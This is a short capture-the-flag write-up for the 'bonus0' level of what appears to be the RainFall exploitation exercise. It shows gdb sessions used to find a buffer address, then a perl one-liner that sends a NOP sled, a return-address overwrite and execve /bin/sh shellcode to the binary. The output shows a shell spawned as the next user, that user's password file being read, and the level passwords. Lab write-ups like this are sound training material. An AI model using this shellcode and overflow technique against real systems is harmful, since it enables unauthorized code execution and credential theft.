# **Bonus0**

## **Analysis**

___

## **Exploit**

OFFSET: 9

```
(gdb) b *p+81
Breakpoint 1 at 0x8048505
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
4242

Breakpoint 1, 0x08048505 in p ()
(gdb) x/4c $eax
0xbfffe680:     52 '4'  50 '2'  52 '4'  50 '2'
(gdb) c
Continuing.
 -
ABCD

Breakpoint 1, 0x08048505 in p ()
(gdb) x/4c $eax
0xbfffe680:     65 'A'  66 'B'  67 'C'  68 'D'
```

0xbfffe680 + 96 = 0xbfffe6e0

96 = 9 + 4 +83

```
bonus0@RainFall:~$ perl -e 'print "\x90" x 4095 . "\n" . "\x90" x 9 . "\xe0\xe6\xff\xbf" . "\x90" x 83 ."\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\n"' > /tmp/bonus0 && cat /tmp/bonus0 - | ./bonus0
 -
 -
������������������������������������������� �����������������������
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

___

*Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728*